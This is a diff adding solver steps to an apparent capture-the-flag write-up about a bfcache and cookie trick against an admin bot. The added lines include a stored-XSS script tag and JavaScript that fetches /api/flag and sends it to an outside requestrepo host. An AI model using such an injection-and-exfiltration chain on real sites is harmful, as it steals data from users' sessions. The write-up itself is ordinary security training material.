@@ -199,6 +199,12 @@ After evicting bfcache and going back to `reports/check`, this endpoint has no c
 When the bot first visits `/reports/check`, it will visit it with the `sid` cookie that it got from the setup process, then `/reports/check` will hand it another cookie, `view`. When we evict the bfcache and go back to `/reports/check`, the endpoint will see two cookies instead of one like before; this no longer matches the cached variant, so Chromium sends a request to Express. It will make a request to the server, and here we can pass the check.
 
 ## solver
+
+1. First, host this on requestrepo `fetch('/api/flag').then(r=>r.json()).then(d=>fetch('http://...requestrepo.com/?f='+encodeURIComponent(d.flag)))`. Make sure the content-type is javascript not html
+
+2. create a note `<script src="https://....requestrepo.com/x.js"></script>`
+
+Host the solve on Cloudflare using `wrangler deploy`
 ```js
 export default {
   async fetch(request) {
@@ -274,3 +280,4 @@ function javascript(body) {
 }
 
 ```
+4. send it to the bot `https://<....>.workers.dev/start?target=http://localhost:3000&note=<note-id>`
